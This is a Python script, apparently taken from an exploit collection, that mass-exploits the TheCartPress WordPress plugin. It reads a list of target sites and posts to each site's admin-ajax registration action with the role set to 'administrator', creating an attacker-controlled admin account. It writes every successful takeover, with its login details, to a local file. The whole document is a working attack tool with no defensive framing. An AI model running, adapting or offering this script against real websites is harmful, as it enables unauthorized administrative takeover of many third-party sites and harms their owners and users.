import requests, os, sys
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Setting Conf
userlogin = "YOUR_USERNAME"
passlogin = "YOUR_PASSWORD"
emailtakeover = "YOUR_MAIL"

# Color
brblue = '\x1b[94m'
white = '\x1b[37m'
green = '\x1b[32m'
red = '\x1b[31m'

def wpthecart(site):
  if '://' in site:
    pass
  else:
    site = 'http://' + site
  try:
    exploitz = {
      'tcp_new_user_name': userlogin,
      'tcp_new_user_pass': passlogin,
      'tcp_repeat_user_pass': passlogin,
      'tcp_new_user_email': emailtakeover,
      'role': 'administrator'
    }
    req = requests.post(site + '/wp-admin/admin-ajax.php?action=tcp_register_and_login_ajax', data=exploitz, timeout=10)
    if (req.text == "\"\""):
      print('{}[{}VULN{}]     '.format(brblue, green, brblue) + site+'/wp-login.php -> Add Admin Success')
      open('AdminTakeover.txt', 'a').write('%s/wp-login.php@%s#%s\n' % (site,userlogin,passlogin))
    else:
      print('{}[{}NOT VULN{}] '.format(brblue, red, brblue) + site)
  except:
    pass 
logo = """
    {}Mass Exploit For TheCartPress Plugins
            {}Created By X-MrG3P5
{}[ {}https://www.exploit-db.com/exploits/50378 {}]""".format(brblue, white, brblue, white, brblue)
print(logo)
url = open(input('Input list : {}'.format(white)),'r').read().split()
Thr = int(input('{}Threads : {}'.format(brblue, white)))
print('\n')
for site in url:
  t = Thread(target=wpthecart, args=(site,))
  t.start()
